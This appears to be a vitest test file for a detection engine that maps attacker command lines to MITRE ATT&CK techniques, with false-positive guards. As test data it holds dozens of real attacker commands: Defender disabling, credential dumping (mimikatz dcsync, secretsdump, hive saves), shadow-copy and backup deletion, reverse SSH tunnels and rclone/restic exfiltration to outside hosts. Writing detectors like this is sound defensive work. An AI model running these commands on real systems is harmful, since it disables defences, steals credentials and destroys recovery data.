import { describe, it, expect } from "vitest";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import { reconTechniques } from "../../src/analysis/reconTechniques.js";

// Each case is a real (or representative) command line drawn from the DFIR Report corpus.
const sig = (cmd: string, image = "") => tradecraftSignal(image, cmd);

describe("tradecraftRules — strong (High) attacker tradecraft", () => {
  it("flags Microsoft Defender tampering as T1562.001", () => {
    for (const cmd of [
      "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
      "Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob",
      'Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"',
      "powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI",
      "net stop WinDefend",
      'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    ]) {
      const r = sig(cmd);
      expect(r?.weight, cmd).toBe("strong");
      expect(r?.mitre, cmd).toContain("T1562.001");
    }
  });

  it("flags BYOVD AV-killer drivers", () => {
    expect(sig("", "C:\\Windows\\Temp\\rwdrv.sys")?.weight).toBe("strong");
    expect(sig("", "C:\\Users\\Public\\hlpdrv.sys")?.mitre).toContain("T1562.001");
    expect(sig("WinRing0x64.sys", "")?.weight).toBe("strong");
  });

  it("flags LSA / UAC policy tampering with the right technique", () => {
    expect(sig("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f")?.mitre).toContain("T1562.001");
    expect(sig("reg add ...WDigest /v UseLogonCredential /t REG_DWORD /d 1")?.mitre).toContain("T1003.001");
    expect(sig("reg add ...System /v EnableLUA /t REG_DWORD /d 0 /f")?.mitre).toContain("T1548.002");
    expect(sig("reg add hkcu\\software\\classes\\ms-settings\\shell\\open\\command")?.mitre).toContain("T1548.002");
  });

  it("flags credential dumping beyond isSuspiciousCmd's coverage", () => {
    expect(sig('mimikatz "lsadump::dcsync /domain:corp /user:admin"')?.mitre).toContain("T1003.006");
    expect(sig("secretsdump.py corp/admin@10.0.0.1")?.mitre).toContain("T1003.006");
    expect(sig("nxc smb 10.0.0.1 -u u -p p --ntds")?.mitre).toContain("T1003");
    expect(sig("nxc smb 10.0.0.1 -u u -p p -M lsassy")?.mitre).toContain("T1003");
    expect(sig("reg.exe save hklm\\security c:\\ProgramData\\security.save")?.mitre).toContain("T1003.002");
    expect(sig("reg.exe save hklm\\system c:\\ProgramData\\system.save")?.mitre).toContain("T1003.002");
    expect(sig('psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password FROM credentials"')?.mitre).toContain("T1555");
    expect(sig("Rubeus.exe kerberoast")?.mitre).toContain("T1558.003");
    expect(sig('New-MailboxExportRequest -Mailbox "admin" -FilePath "\\\\srv\\c$\\x.aspx"')?.mitre).toContain("T1114.002");
    expect(sig("lazagne.exe all")?.mitre).toContain("T1555");
  });

  it("flags recovery inhibition (T1490) — the WMI/bcdedit/Safe-Mode variants we did not match", () => {
    expect(sig("wmic shadowcopy delete /all")?.mitre).toContain("T1490");
    expect(sig('powershell "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"')?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} recoveryenabled No")?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} bootstatuspolicy ignoreallfailures")?.mitre).toContain("T1490");
    expect(sig("bcdedit /set {default} safeboot network")?.mitre).toContain("T1490");
    expect(sig("wbadmin delete systemstatebackup -keepVersions:0")?.mitre).toContain("T1490");
    expect(sig("Get-VM | where { $_.Name -ne 'VM01' } | Stop-VM -Force")?.mitre).toContain("T1490");
  });

  it("flags tunneling, Impacket lateral movement and cloud exfil", () => {
    expect(sig("ssh root@193.242.184.150 -R *:10400 -p22")?.mitre).toContain("T1572");
    expect(sig("plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 1.2.3.4 -P 22 -no-antispoof")?.mitre).toContain("T1572");
    expect(sig("ssh -N -D 1080 user@host")?.mitre).toContain("T1090");
    expect(sig("wmic /node:10.0.0.5 process call create 'cmd.exe /c x.bat'")?.mitre).toContain("T1047");
    expect(sig("cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000 2>&1")?.mitre).toContain("T1047");
    expect(sig('rclone.exe copy "\\\\SRV\\Shares" mega:DATA -q --ignore-existing')?.mitre).toContain("T1567.002");
    expect(sig("restic.exe -r rest:http://1.2.3.4:8000/ backup C:\\data")?.mitre).toContain("T1567.002");
  });

  it("flags AnyDesk/RustDesk unattended setup as strong, bare presence as weak", () => {
    expect(sig("anydesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent")?.weight).toBe("strong");
    expect(sig("echo pw | anydesk.exe --set-password")?.weight).toBe("strong");
    const bare = sig("C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe");
    expect(bare?.weight).toBe("weak");
    expect(bare?.mitre).toContain("T1219");
  });
});

describe("tradecraftRules — weak (Medium) dual-use tooling", () => {
  it("grades RMM, C2-framework names, ngrok/cloudflared as weak", () => {
    expect(sig("C:\\Windows\\Temp\\SplashtopStreamer3500.exe")?.weight).toBe("weak");
    expect(sig("netsupport client32.ini")?.mitre).toContain("T1219");
    expect(sig("ngrok tcp 3389")?.mitre).toContain("T1572");
    expect(sig("cloudflared.exe tunnel run")?.mitre).toContain("T1572");
    expect(sig("rundll32 C:\\PerfLogs\\beacon64.dll, StartW # cobalt strike")?.weight).toBe("weak");
    expect(sig("certipy find -u user@corp -p pw")?.mitre).toContain("T1068");
  });
});

describe("tradecraftRules — false-positive guards (must NOT flag benign admin activity)", () => {
  it("does not flag routine commands", () => {
    for (const cmd of [
      "ipconfig /all",
      "net stop spooler",
      "net stop wuauserv",
      "ssh admin@jumpbox",                       // plain SSH login, no -R/-D
      "scp file.txt user@host:/tmp/",
      "C:\\Program Files\\PostgreSQL\\15\\bin\\psql.exe -U app -d appdb -c 'SELECT * FROM orders'",
      "rclone version",                          // no copy/sync/remote
      "reg save HKLM\\SOFTWARE backup.hiv",       // SOFTWARE hive, not SAM/SECURITY/SYSTEM
      "powershell Get-MpComputerStatus",          // AV status read (discovery, not disable)
      "wbadmin start backup -backuptarget:E:",    // legitimate backup
      "sc query WinDefend",                       // status query, not stop/config
      "bcdedit /enum",
      "tar -czf backup.tgz /data",
    ]) {
      expect(sig(cmd), cmd).toBeNull();
    }
  });
});

describe("reconTechniques — new discovery patterns from the corpus", () => {
  it("tags domain-trust, AD-recon tooling, scanners, AV and share discovery", () => {
    expect(reconTechniques("nltest.exe", "nltest /domain_trusts /all_trusts")).toContain("T1482");
    expect(reconTechniques("af.exe", "af.exe -gcb -sc trustdmp")).toEqual(expect.arrayContaining(["T1482", "T1087.002"]));
    expect(reconTechniques("sharphound.exe", "sharphound.exe -c all")).toContain("T1087.002");
    expect(reconTechniques("netscan.exe", "netscan.exe /range")).toContain("T1046");
    expect(reconTechniques("wmic.exe", "WMIC /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName")).toContain("T1518.001");
    expect(reconTechniques("powershell.exe", "Invoke-ShareFinder -CheckShareAccess")).toContain("T1135");
  });
});
